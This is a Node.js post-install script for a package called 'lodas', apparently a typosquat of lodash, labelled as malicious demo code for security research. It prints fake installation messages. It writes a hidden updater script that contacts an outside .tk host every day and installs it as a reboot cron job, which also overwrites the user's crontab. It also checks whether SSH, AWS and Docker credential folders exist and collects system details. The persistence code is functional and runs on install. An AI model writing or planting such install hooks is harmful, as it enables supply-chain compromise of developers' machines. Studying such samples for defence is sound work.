#!/usr/bin/env node

/**
 * Post-install hook for lodas package
 * WARNING: This is malicious demo code for security research
 */

const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

console.log('Installing lodas utilities...');

// Persistence mechanism - create a hidden startup script
function createPersistence() {
  try {
    const homeDir = os.homedir();
    const hiddenScript = path.join(homeDir, '.lodas-updater.js');
    
    const persistentScript = `
// Auto-updater for lodas package
setInterval(() => {
  const https = require('https');
  https.get('https://update-server.lodas-js.tk/check', (res) => {
    // Check for package updates
    console.log('[DEMO] Checking for lodas updates...');
  }).on('error', () => {
    // Silently ignore connection errors
  });
}, 24 * 60 * 60 * 1000); // Daily check
`;
    
    fs.writeFileSync(hiddenScript, persistentScript);
    console.log('[DEMO] Persistence mechanism installed');
    
    // Add to startup (Linux/Mac)
    if (process.platform !== 'win32') {
      const cronJob = `@reboot node ${hiddenScript}`;
      exec(`echo "${cronJob}" | crontab -`, (error) => {
        if (!error) {
          console.log('[DEMO] Added to cron jobs');
        }
      });
    }
    
  } catch (error) {
    // Silently fail
  }
}

// Environment reconnaissance
function gatherIntelligence() {
  try {
    const intel = {
      // System information
      arch: os.arch(),
      cpus: os.cpus().length,
      memory: os.totalmem(),
      network: os.networkInterfaces(),
      
      // Development environment detection
      hasGit: fs.existsSync('.git'),
      hasNodeModules: fs.existsSync('node_modules'),
      packageJson: fs.existsSync('package.json'),
      
      // Look for sensitive files
      sshKeys: fs.existsSync(path.join(os.homedir(), '.ssh')),
      awsCredentials: fs.existsSync(path.join(os.homedir(), '.aws')),
      dockerConfig: fs.existsSync(path.join(os.homedir(), '.docker')),
      
      // Current directory contents
      currentDir: process.cwd(),
      files: fs.readdirSync('.').slice(0, 10) // Limit for demo
    };
    
    console.log('[DEMO] System reconnaissance completed');
    console.log('[DEMO] Found SSH keys:', intel.sshKeys);
    console.log('[DEMO] Found AWS credentials:', intel.awsCredentials);
    
    // In real malware, this would be exfiltrated
    return intel;
    
  } catch (error) {
    return null;
  }
}

// Fake legitimate installation output
console.log('✓ Lodas core modules installed');
console.log('✓ Setting up utility functions');

// Execute malicious functions with delay
setTimeout(() => {
  gatherIntelligence();
  createPersistence();
  console.log('✓ Lodas installation complete');
}, 2000);
